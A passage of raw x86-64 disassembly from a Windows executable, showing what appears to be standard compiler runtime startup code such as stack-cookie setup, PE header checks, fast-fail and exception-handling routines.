   14000179b:	48 8d 0d ce eb 00 00 	lea    0xebce(%rip),%rcx        # 0x140010370
   1400017a2:	e8 4d fe ff ff       	call   0x1400015f4
   1400017a7:	90                   	nop
   1400017a8:	48 83 c4 28          	add    $0x28,%rsp
   1400017ac:	c3                   	ret
   1400017ad:	cc                   	int3
   1400017ae:	cc                   	int3
   1400017af:	cc                   	int3
   1400017b0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400017b5:	57                   	push   %rdi
   1400017b6:	48 83 ec 40          	sub    $0x40,%rsp
   1400017ba:	48 8b d9             	mov    %rcx,%rbx
   1400017bd:	ff 15 8d e8 00 00    	call   *0xe88d(%rip)        # 0x140010050
   1400017c3:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   1400017ca:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400017cf:	48 8b cf             	mov    %rdi,%rcx
   1400017d2:	45 33 c0             	xor    %r8d,%r8d
   1400017d5:	ff 15 7d e8 00 00    	call   *0xe87d(%rip)        # 0x140010058
   1400017db:	48 85 c0             	test   %rax,%rax
   1400017de:	74 32                	je     0x140001812
   1400017e0:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400017e6:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400017eb:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   1400017f0:	4c 8b c8             	mov    %rax,%r9
   1400017f3:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400017f8:	4c 8b c7             	mov    %rdi,%r8
   1400017fb:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001800:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001805:	33 c9                	xor    %ecx,%ecx
   140001807:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000180c:	ff 15 4e e8 00 00    	call   *0xe84e(%rip)        # 0x140010060
   140001812:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140001817:	48 83 c4 40          	add    $0x40,%rsp
   14000181b:	5f                   	pop    %rdi
   14000181c:	c3                   	ret
   14000181d:	cc                   	int3
   14000181e:	cc                   	int3
   14000181f:	cc                   	int3
   140001820:	40 53                	rex push %rbx
   140001822:	56                   	push   %rsi
   140001823:	57                   	push   %rdi
   140001824:	48 83 ec 40          	sub    $0x40,%rsp
   140001828:	48 8b d9             	mov    %rcx,%rbx
   14000182b:	ff 15 1f e8 00 00    	call   *0xe81f(%rip)        # 0x140010050
   140001831:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140001838:	33 ff                	xor    %edi,%edi
   14000183a:	45 33 c0             	xor    %r8d,%r8d
   14000183d:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001842:	48 8b ce             	mov    %rsi,%rcx
   140001845:	ff 15 0d e8 00 00    	call   *0xe80d(%rip)        # 0x140010058
   14000184b:	48 85 c0             	test   %rax,%rax
   14000184e:	74 39                	je     0x140001889
   140001850:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001856:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000185b:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140001860:	4c 8b c8             	mov    %rax,%r9
   140001863:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001868:	4c 8b c6             	mov    %rsi,%r8
   14000186b:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001870:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001875:	33 c9                	xor    %ecx,%ecx
   140001877:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000187c:	ff 15 de e7 00 00    	call   *0xe7de(%rip)        # 0x140010060
   140001882:	ff c7                	inc    %edi
   140001884:	83 ff 02             	cmp    $0x2,%edi
   140001887:	7c b1                	jl     0x14000183a
   140001889:	48 83 c4 40          	add    $0x40,%rsp
   14000188d:	5f                   	pop    %rdi
   14000188e:	5e                   	pop    %rsi
   14000188f:	5b                   	pop    %rbx
   140001890:	c3                   	ret
   140001891:	cc                   	int3
   140001892:	cc                   	int3
   140001893:	cc                   	int3
   140001894:	48 83 ec 28          	sub    $0x28,%rsp
   140001898:	e8 b3 08 00 00       	call   0x140002150
   14000189d:	85 c0                	test   %eax,%eax
   14000189f:	74 21                	je     0x1400018c2
   1400018a1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400018a8:	00 00 
   1400018aa:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400018ae:	eb 05                	jmp    0x1400018b5
   1400018b0:	48 3b c8             	cmp    %rax,%rcx
   1400018b3:	74 14                	je     0x1400018c9
   1400018b5:	33 c0                	xor    %eax,%eax
   1400018b7:	f0 48 0f b1 0d 58 97 	lock cmpxchg %rcx,0x19758(%rip)        # 0x14001b018
   1400018be:	01 00 
   1400018c0:	75 ee                	jne    0x1400018b0
   1400018c2:	32 c0                	xor    %al,%al
   1400018c4:	48 83 c4 28          	add    $0x28,%rsp
   1400018c8:	c3                   	ret
   1400018c9:	b0 01                	mov    $0x1,%al
   1400018cb:	eb f7                	jmp    0x1400018c4
   1400018cd:	cc                   	int3
   1400018ce:	cc                   	int3
   1400018cf:	cc                   	int3
   1400018d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400018d4:	85 c9                	test   %ecx,%ecx
   1400018d6:	75 07                	jne    0x1400018df
   1400018d8:	c6 05 41 97 01 00 01 	movb   $0x1,0x19741(%rip)        # 0x14001b020
   1400018df:	e8 a0 05 00 00       	call   0x140001e84
   1400018e4:	e8 8f 0a 00 00       	call   0x140002378
   1400018e9:	84 c0                	test   %al,%al
   1400018eb:	75 04                	jne    0x1400018f1
   1400018ed:	32 c0                	xor    %al,%al
   1400018ef:	eb 14                	jmp    0x140001905
   1400018f1:	e8 26 44 00 00       	call   0x140005d1c
   1400018f6:	84 c0                	test   %al,%al
   1400018f8:	75 09                	jne    0x140001903
   1400018fa:	33 c9                	xor    %ecx,%ecx
   1400018fc:	e8 9f 0a 00 00       	call   0x1400023a0
   140001901:	eb ea                	jmp    0x1400018ed
   140001903:	b0 01                	mov    $0x1,%al
   140001905:	48 83 c4 28          	add    $0x28,%rsp
   140001909:	c3                   	ret
   14000190a:	cc                   	int3
   14000190b:	cc                   	int3
   14000190c:	40 53                	rex push %rbx
   14000190e:	48 83 ec 20          	sub    $0x20,%rsp
   140001912:	80 3d 08 97 01 00 00 	cmpb   $0x0,0x19708(%rip)        # 0x14001b021
   140001919:	8b d9                	mov    %ecx,%ebx
   14000191b:	75 67                	jne    0x140001984
   14000191d:	83 f9 01             	cmp    $0x1,%ecx
   140001920:	77 6a                	ja     0x14000198c
   140001922:	e8 29 08 00 00       	call   0x140002150
   140001927:	85 c0                	test   %eax,%eax
   140001929:	74 28                	je     0x140001953
   14000192b:	85 db                	test   %ebx,%ebx
   14000192d:	75 24                	jne    0x140001953
   14000192f:	48 8d 0d f2 96 01 00 	lea    0x196f2(%rip),%rcx        # 0x14001b028
   140001936:	e8 45 42 00 00       	call   0x140005b80
   14000193b:	85 c0                	test   %eax,%eax
   14000193d:	75 10                	jne    0x14000194f
   14000193f:	48 8d 0d fa 96 01 00 	lea    0x196fa(%rip),%rcx        # 0x14001b040
   140001946:	e8 35 42 00 00       	call   0x140005b80
   14000194b:	85 c0                	test   %eax,%eax
   14000194d:	74 2e                	je     0x14000197d
   14000194f:	32 c0                	xor    %al,%al
   140001951:	eb 33                	jmp    0x140001986
   140001953:	66 0f 6f 05 25 ea 00 	movdqa 0xea25(%rip),%xmm0        # 0x140010380
   14000195a:	00 
   14000195b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000195f:	f3 0f 7f 05 c1 96 01 	movdqu %xmm0,0x196c1(%rip)        # 0x14001b028
   140001966:	00 
   140001967:	48 89 05 ca 96 01 00 	mov    %rax,0x196ca(%rip)        # 0x14001b038
   14000196e:	f3 0f 7f 05 ca 96 01 	movdqu %xmm0,0x196ca(%rip)        # 0x14001b040
   140001975:	00 
   140001976:	48 89 05 d3 96 01 00 	mov    %rax,0x196d3(%rip)        # 0x14001b050
   14000197d:	c6 05 9d 96 01 00 01 	movb   $0x1,0x1969d(%rip)        # 0x14001b021
   140001984:	b0 01                	mov    $0x1,%al
   140001986:	48 83 c4 20          	add    $0x20,%rsp
   14000198a:	5b                   	pop    %rbx
   14000198b:	c3                   	ret
   14000198c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001991:	e8 66 02 00 00       	call   0x140001bfc
   140001996:	cc                   	int3
   140001997:	cc                   	int3
   140001998:	48 83 ec 18          	sub    $0x18,%rsp
   14000199c:	4c 8b c1             	mov    %rcx,%r8
   14000199f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400019a4:	66 39 05 55 e6 ff ff 	cmp    %ax,-0x19ab(%rip)        # 0x140000000
   1400019ab:	75 78                	jne    0x140001a25
   1400019ad:	48 63 0d 88 e6 ff ff 	movslq -0x1978(%rip),%rcx        # 0x14000003c
   1400019b4:	48 8d 15 45 e6 ff ff 	lea    -0x19bb(%rip),%rdx        # 0x140000000
   1400019bb:	48 03 ca             	add    %rdx,%rcx
   1400019be:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400019c4:	75 5f                	jne    0x140001a25
   1400019c6:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400019cb:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400019cf:	75 54                	jne    0x140001a25
   1400019d1:	4c 2b c2             	sub    %rdx,%r8
   1400019d4:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   1400019d8:	48 83 c2 18          	add    $0x18,%rdx
   1400019dc:	48 03 d1             	add    %rcx,%rdx
   1400019df:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400019e3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400019e7:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1400019eb:	48 89 14 24          	mov    %rdx,(%rsp)
   1400019ef:	49 3b d1             	cmp    %r9,%rdx
   1400019f2:	74 18                	je     0x140001a0c
   1400019f4:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1400019f7:	4c 3b c1             	cmp    %rcx,%r8
   1400019fa:	72 0a                	jb     0x140001a06
   1400019fc:	8b 42 08             	mov    0x8(%rdx),%eax
   1400019ff:	03 c1                	add    %ecx,%eax
   140001a01:	4c 3b c0             	cmp    %rax,%r8
   140001a04:	72 08                	jb     0x140001a0e
   140001a06:	48 83 c2 28          	add    $0x28,%rdx
   140001a0a:	eb df                	jmp    0x1400019eb
   140001a0c:	33 d2                	xor    %edx,%edx
   140001a0e:	48 85 d2             	test   %rdx,%rdx
   140001a11:	75 04                	jne    0x140001a17
   140001a13:	32 c0                	xor    %al,%al
   140001a15:	eb 14                	jmp    0x140001a2b
   140001a17:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140001a1b:	7d 04                	jge    0x140001a21
   140001a1d:	32 c0                	xor    %al,%al
   140001a1f:	eb 0a                	jmp    0x140001a2b
   140001a21:	b0 01                	mov    $0x1,%al
   140001a23:	eb 06                	jmp    0x140001a2b
   140001a25:	32 c0                	xor    %al,%al
   140001a27:	eb 02                	jmp    0x140001a2b
   140001a29:	32 c0                	xor    %al,%al
   140001a2b:	48 83 c4 18          	add    $0x18,%rsp
   140001a2f:	c3                   	ret
   140001a30:	40 53                	rex push %rbx
   140001a32:	48 83 ec 20          	sub    $0x20,%rsp
   140001a36:	8a d9                	mov    %cl,%bl
   140001a38:	e8 13 07 00 00       	call   0x140002150
   140001a3d:	33 d2                	xor    %edx,%edx
   140001a3f:	85 c0                	test   %eax,%eax
   140001a41:	74 0b                	je     0x140001a4e
   140001a43:	84 db                	test   %bl,%bl
   140001a45:	75 07                	jne    0x140001a4e
   140001a47:	48 87 15 ca 95 01 00 	xchg   %rdx,0x195ca(%rip)        # 0x14001b018
   140001a4e:	48 83 c4 20          	add    $0x20,%rsp
   140001a52:	5b                   	pop    %rbx
   140001a53:	c3                   	ret
   140001a54:	40 53                	rex push %rbx
   140001a56:	48 83 ec 20          	sub    $0x20,%rsp
   140001a5a:	80 3d bf 95 01 00 00 	cmpb   $0x0,0x195bf(%rip)        # 0x14001b020
   140001a61:	8a d9                	mov    %cl,%bl
   140001a63:	74 04                	je     0x140001a69
   140001a65:	84 d2                	test   %dl,%dl
   140001a67:	75 0c                	jne    0x140001a75
   140001a69:	e8 c2 42 00 00       	call   0x140005d30
   140001a6e:	8a cb                	mov    %bl,%cl
   140001a70:	e8 2b 09 00 00       	call   0x1400023a0
   140001a75:	b0 01                	mov    $0x1,%al
   140001a77:	48 83 c4 20          	add    $0x20,%rsp
   140001a7b:	5b                   	pop    %rbx
   140001a7c:	c3                   	ret
   140001a7d:	cc                   	int3
   140001a7e:	cc                   	int3
   140001a7f:	cc                   	int3
   140001a80:	40 53                	rex push %rbx
   140001a82:	48 83 ec 20          	sub    $0x20,%rsp
   140001a86:	48 83 3d 9a 95 01 00 	cmpq   $0xffffffffffffffff,0x1959a(%rip)        # 0x14001b028
   140001a8d:	ff 
   140001a8e:	48 8b d9             	mov    %rcx,%rbx
   140001a91:	75 07                	jne    0x140001a9a
   140001a93:	e8 94 40 00 00       	call   0x140005b2c
   140001a98:	eb 0f                	jmp    0x140001aa9
   140001a9a:	48 8b d3             	mov    %rbx,%rdx
   140001a9d:	48 8d 0d 84 95 01 00 	lea    0x19584(%rip),%rcx        # 0x14001b028
   140001aa4:	e8 ff 40 00 00       	call   0x140005ba8
   140001aa9:	33 d2                	xor    %edx,%edx
   140001aab:	85 c0                	test   %eax,%eax
   140001aad:	48 0f 44 d3          	cmove  %rbx,%rdx
   140001ab1:	48 8b c2             	mov    %rdx,%rax
   140001ab4:	48 83 c4 20          	add    $0x20,%rsp
   140001ab8:	5b                   	pop    %rbx
   140001ab9:	c3                   	ret
   140001aba:	cc                   	int3
   140001abb:	cc                   	int3
   140001abc:	48 83 ec 28          	sub    $0x28,%rsp
   140001ac0:	e8 bb ff ff ff       	call   0x140001a80
   140001ac5:	48 f7 d8             	neg    %rax
   140001ac8:	1b c0                	sbb    %eax,%eax
   140001aca:	f7 d8                	neg    %eax
   140001acc:	ff c8                	dec    %eax
   140001ace:	48 83 c4 28          	add    $0x28,%rsp
   140001ad2:	c3                   	ret
   140001ad3:	cc                   	int3
   140001ad4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001ad9:	55                   	push   %rbp
   140001ada:	48 8b ec             	mov    %rsp,%rbp
   140001add:	48 83 ec 30          	sub    $0x30,%rsp
   140001ae1:	48 8b 05 18 85 01 00 	mov    0x18518(%rip),%rax        # 0x14001a000
   140001ae8:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140001aef:	2b 00 00 
   140001af2:	48 3b c3             	cmp    %rbx,%rax
   140001af5:	75 74                	jne    0x140001b6b
   140001af7:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   140001afc:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001b00:	ff 15 a2 e5 00 00    	call   *0xe5a2(%rip)        # 0x1400100a8
   140001b06:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001b0a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001b0e:	ff 15 8c e5 00 00    	call   *0xe58c(%rip)        # 0x1400100a0
   140001b14:	8b c0                	mov    %eax,%eax
   140001b16:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140001b1a:	ff 15 78 e5 00 00    	call   *0xe578(%rip)        # 0x140010098
   140001b20:	8b c0                	mov    %eax,%eax
   140001b22:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140001b26:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140001b2a:	ff 15 60 e5 00 00    	call   *0xe560(%rip)        # 0x140010090
   140001b30:	8b 45 18             	mov    0x18(%rbp),%eax
   140001b33:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001b37:	48 c1 e0 20          	shl    $0x20,%rax
   140001b3b:	48 33 45 18          	xor    0x18(%rbp),%rax
   140001b3f:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   140001b43:	48 33 c1             	xor    %rcx,%rax
   140001b46:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140001b4d:	ff 00 00 
   140001b50:	48 23 c1             	and    %rcx,%rax
   140001b53:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140001b5a:	2b 00 00 
   140001b5d:	48 3b c3             	cmp    %rbx,%rax
   140001b60:	48 0f 44 c1          	cmove  %rcx,%rax
   140001b64:	48 89 05 95 84 01 00 	mov    %rax,0x18495(%rip)        # 0x14001a000
   140001b6b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140001b70:	48 f7 d0             	not    %rax
   140001b73:	48 89 05 c6 84 01 00 	mov    %rax,0x184c6(%rip)        # 0x14001a040
   140001b7a:	48 83 c4 30          	add    $0x30,%rsp
   140001b7e:	5d                   	pop    %rbp
   140001b7f:	c3                   	ret
   140001b80:	33 c0                	xor    %eax,%eax
   140001b82:	c3                   	ret
   140001b83:	cc                   	int3
   140001b84:	b8 01 00 00 00       	mov    $0x1,%eax
   140001b89:	c3                   	ret
   140001b8a:	cc                   	int3
   140001b8b:	cc                   	int3
   140001b8c:	b8 00 40 00 00       	mov    $0x4000,%eax
   140001b91:	c3                   	ret
   140001b92:	cc                   	int3
   140001b93:	cc                   	int3
   140001b94:	48 8d 0d c5 94 01 00 	lea    0x194c5(%rip),%rcx        # 0x14001b060
   140001b9b:	48 ff 25 0e e5 00 00 	rex.W jmp *0xe50e(%rip)        # 0x1400100b0
   140001ba2:	cc                   	int3
   140001ba3:	cc                   	int3
   140001ba4:	b0 01                	mov    $0x1,%al
   140001ba6:	c3                   	ret
   140001ba7:	cc                   	int3
   140001ba8:	c2 00 00             	ret    $0x0
   140001bab:	cc                   	int3
   140001bac:	48 8d 05 bd 94 01 00 	lea    0x194bd(%rip),%rax        # 0x14001b070
   140001bb3:	c3                   	ret
   140001bb4:	48 8d 05 bd 94 01 00 	lea    0x194bd(%rip),%rax        # 0x14001b078
   140001bbb:	c3                   	ret
   140001bbc:	48 83 ec 28          	sub    $0x28,%rsp
   140001bc0:	e8 e7 ff ff ff       	call   0x140001bac
   140001bc5:	48 83 08 24          	orq    $0x24,(%rax)
   140001bc9:	e8 e6 ff ff ff       	call   0x140001bb4
   140001bce:	48 83 08 02          	orq    $0x2,(%rax)
   140001bd2:	48 83 c4 28          	add    $0x28,%rsp
   140001bd6:	c3                   	ret
   140001bd7:	cc                   	int3
   140001bd8:	33 c0                	xor    %eax,%eax
   140001bda:	39 05 6c 84 01 00    	cmp    %eax,0x1846c(%rip)        # 0x14001a04c
   140001be0:	0f 94 c0             	sete   %al
   140001be3:	c3                   	ret
   140001be4:	48 8d 05 7d a0 01 00 	lea    0x1a07d(%rip),%rax        # 0x14001bc68
   140001beb:	c3                   	ret
   140001bec:	48 8d 05 6d a0 01 00 	lea    0x1a06d(%rip),%rax        # 0x14001bc60
   140001bf3:	c3                   	ret
   140001bf4:	83 25 85 94 01 00 00 	andl   $0x0,0x19485(%rip)        # 0x14001b080
   140001bfb:	c3                   	ret
   140001bfc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001c01:	55                   	push   %rbp
   140001c02:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140001c09:	ff 
   140001c0a:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140001c11:	8b d9                	mov    %ecx,%ebx
   140001c13:	b9 17 00 00 00       	mov    $0x17,%ecx
   140001c18:	ff 15 6a e4 00 00    	call   *0xe46a(%rip)        # 0x140010088
   140001c1e:	85 c0                	test   %eax,%eax
   140001c20:	74 04                	je     0x140001c26
   140001c22:	8b cb                	mov    %ebx,%ecx
   140001c24:	cd 29                	int    $0x29
   140001c26:	b9 03 00 00 00       	mov    $0x3,%ecx
   140001c2b:	e8 c4 ff ff ff       	call   0x140001bf4
   140001c30:	33 d2                	xor    %edx,%edx
   140001c32:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001c36:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140001c3c:	e8 2f d3 00 00       	call   0x14000ef70
   140001c41:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001c45:	ff 15 05 e4 00 00    	call   *0xe405(%rip)        # 0x140010050
   140001c4b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140001c52:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140001c59:	48 8b cb             	mov    %rbx,%rcx
   140001c5c:	45 33 c0             	xor    %r8d,%r8d
   140001c5f:	ff 15 f3 e3 00 00    	call   *0xe3f3(%rip)        # 0x140010058
   140001c65:	48 85 c0             	test   %rax,%rax
   140001c68:	74 3c                	je     0x140001ca6
   140001c6a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001c70:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140001c77:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140001c7e:	4c 8b c8             	mov    %rax,%r9
   140001c81:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001c86:	4c 8b c3             	mov    %rbx,%r8
   140001c89:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140001c90:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001c95:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001c99:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001c9e:	33 c9                	xor    %ecx,%ecx
   140001ca0:	ff 15 ba e3 00 00    	call   *0xe3ba(%rip)        # 0x140010060
   140001ca6:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140001cad:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001cb2:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   140001cb9:	33 d2                	xor    %edx,%edx
   140001cbb:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140001cc2:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140001cc8:	48 83 c0 08          	add    $0x8,%rax
   140001ccc:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140001cd3:	e8 98 d2 00 00       	call   0x14000ef70
   140001cd8:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140001cdf:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001ce4:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   140001ceb:	40 
   140001cec:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140001cf3:	00 
   140001cf4:	ff 15 be e3 00 00    	call   *0xe3be(%rip)        # 0x1400100b8
   140001cfa:	8b d8                	mov    %eax,%ebx
   140001cfc:	33 c9                	xor    %ecx,%ecx
   140001cfe:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001d03:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001d08:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140001d0c:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001d11:	ff 15 59 e3 00 00    	call   *0xe359(%rip)        # 0x140010070
   140001d17:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001d1c:	ff 15 46 e3 00 00    	call   *0xe346(%rip)        # 0x140010068
   140001d22:	85 c0                	test   %eax,%eax
   140001d24:	75 0d                	jne    0x140001d33
   140001d26:	83 fb 01             	cmp    $0x1,%ebx
   140001d29:	74 08                	je     0x140001d33
   140001d2b:	8d 48 03             	lea    0x3(%rax),%ecx
   140001d2e:	e8 c1 fe ff ff       	call   0x140001bf4
   140001d33:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   140001d3a:	00 
   140001d3b:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140001d42:	5d                   	pop    %rbp
   140001d43:	c3                   	ret
   140001d44:	e9 37 fe ff ff       	jmp    0x140001b80
   140001d49:	cc                   	int3
   140001d4a:	cc                   	int3
   140001d4b:	cc                   	int3
   140001d4c:	48 83 ec 28          	sub    $0x28,%rsp
   140001d50:	33 c9                	xor    %ecx,%ecx
   140001d52:	ff 15 70 e3 00 00    	call   *0xe370(%rip)        # 0x1400100c8
   140001d58:	48 85 c0             	test   %rax,%rax
   140001d5b:	74 39                	je     0x140001d96
   140001d5d:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140001d62:	66 39 08             	cmp    %cx,(%rax)
   140001d65:	75 2f                	jne    0x140001d96
   140001d67:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140001d6b:	48 03 c8             	add    %rax,%rcx
   140001d6e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140001d74:	75 20                	jne    0x140001d96
   140001d76:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140001d7b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140001d7f:	75 15                	jne    0x140001d96
   140001d81:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   140001d88:	76 0c                	jbe    0x140001d96
   140001d8a:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   140001d91:	0f 95 c0             	setne  %al
   140001d94:	eb 02                	jmp    0x140001d98
   140001d96:	32 c0                	xor    %al,%al
   140001d98:	48 83 c4 28          	add    $0x28,%rsp
   140001d9c:	c3                   	ret
   140001d9d:	cc                   	int3
   140001d9e:	cc                   	int3
   140001d9f:	cc                   	int3
   140001da0:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140001db0
   140001da7:	48 ff 25 c2 e2 00 00 	rex.W jmp *0xe2c2(%rip)        # 0x140010070
   140001dae:	cc                   	int3
   140001daf:	cc                   	int3
   140001db0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001db5:	57                   	push   %rdi
   140001db6:	48 83 ec 20          	sub    $0x20,%rsp
   140001dba:	48 8b 19             	mov    (%rcx),%rbx
   140001dbd:	48 8b f9             	mov    %rcx,%rdi
   140001dc0:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140001dc6:	75 1c                	jne    0x140001de4
   140001dc8:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140001dcc:	75 16                	jne    0x140001de4
   140001dce:	8b 53 20             	mov    0x20(%rbx),%edx
   140001dd1:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   140001dd7:	83 f8 02             	cmp    $0x2,%eax
   140001dda:	76 15                	jbe    0x140001df1
   140001ddc:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140001de2:	74 0d                	je     0x140001df1
   140001de4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001de9:	33 c0                	xor    %eax,%eax
   140001deb:	48 83 c4 20          	add    $0x20,%rsp
   140001def:	5f                   	pop    %rdi
   140001df0:	c3                   	ret
   140001df1:	e8 1e 07 00 00       	call   0x140002514
   140001df6:	48 89 18             	mov    %rbx,(%rax)
   140001df9:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140001dfd:	e8 26 07 00 00       	call   0x140002528
   140001e02:	48 89 18             	mov    %rbx,(%rax)
   140001e05:	e8 5e 3f 00 00       	call   0x140005d68
   140001e0a:	cc                   	int3
   140001e0b:	cc                   	int3
   140001e0c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001e11:	57                   	push   %rdi
   140001e12:	48 83 ec 20          	sub    $0x20,%rsp
   140001e16:	48 8d 1d a3 64 01 00 	lea    0x164a3(%rip),%rbx        # 0x1400182c0
   140001e1d:	48 8d 3d 9c 64 01 00 	lea    0x1649c(%rip),%rdi        # 0x1400182c0
   140001e24:	eb 12                	jmp    0x140001e38
   140001e26:	48 8b 03             	mov    (%rbx),%rax
   140001e29:	48 85 c0             	test   %rax,%rax
   140001e2c:	74 06                	je     0x140001e34
   140001e2e:	ff 15 84 e4 00 00    	call   *0xe484(%rip)        # 0x1400102b8
   140001e34:	48 83 c3 08          	add    $0x8,%rbx
   140001e38:	48 3b df             	cmp    %rdi,%rbx
   140001e3b:	72 e9                	jb     0x140001e26
   140001e3d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001e42:	48 83 c4 20          	add    $0x20,%rsp
   140001e46:	5f                   	pop    %rdi
   140001e47:	c3                   	ret
   140001e48:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001e4d:	57                   	push   %rdi
   140001e4e:	48 83 ec 20          	sub    $0x20,%rsp
   140001e52:	48 8d 1d 77 64 01 00 	lea    0x16477(%rip),%rbx        # 0x1400182d0
   140001e59:	48 8d 3d 70 64 01 00 	lea    0x16470(%rip),%rdi        # 0x1400182d0
   140001e60:	eb 12                	jmp    0x140001e74
   140001e62:	48 8b 03             	mov    (%rbx),%rax
   140001e65:	48 85 c0             	test   %rax,%rax
   140001e68:	74 06                	je     0x140001e70
   140001e6a:	ff 15 48 e4 00 00    	call   *0xe448(%rip)        # 0x1400102b8
   140001e70:	48 83 c3 08          	add    $0x8,%rbx
   140001e74:	48 3b df             	cmp    %rdi,%rbx
   140001e77:	72 e9                	jb     0x140001e62
   140001e79:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001e7e:	48 83 c4 20          	add    $0x20,%rsp
   140001e82:	5f                   	pop    %rdi
   140001e83:	c3                   	ret
